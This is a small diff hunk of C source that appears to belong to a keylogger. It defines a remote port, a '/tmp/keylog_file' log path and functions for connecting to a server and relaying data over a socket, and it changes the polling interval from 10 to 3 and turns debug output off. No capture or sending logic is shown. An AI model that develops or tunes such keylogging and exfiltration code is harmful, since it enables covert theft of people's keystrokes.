@@ -7,9 +7,9 @@
 #include <arpa/inet.h>
 
 #define REMOTE_PORT 2001
-#define POLL_DURATION 10
+#define POLL_DURATION 3
 #define FILE_LOCATION "/tmp/keylog_file"
-#define DEBUG 1
+#define DEBUG 0
 
 int attempt_connection_to_server(char * remote_address);
 void read_and_write(int socket_fd);
